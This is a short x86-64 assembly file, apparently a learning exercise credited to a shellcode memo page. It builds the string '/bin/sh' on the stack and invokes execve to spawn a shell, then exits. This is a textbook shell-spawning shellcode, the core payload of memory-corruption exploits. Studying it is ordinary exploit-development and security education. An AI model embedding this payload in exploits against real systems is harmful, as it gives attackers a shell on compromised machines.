; Kudos to https://masterccc.github.io/memo/shellcode/ 

global _start

SECTION .text

_start:
  ; set register RDX  and RSI to Zero
  mov rdx, 0
  mov rsi, 0

  ; Push string /bin/sh via register to stack - Conventional method
  mov rax, 0x68732f6e69622f ; "/bin/sh"
  push rax
  
  mov rdi,rsp
  
  ; set register RAX to 0x3b sys_execve (59)
  mov rax, 0x3b
  
  ; Call the kernel
  syscall

; Quit
  mov  rbx,0       ; return code
  mov  rax,1       ; exit syscall number
  int  0x80        ; syscall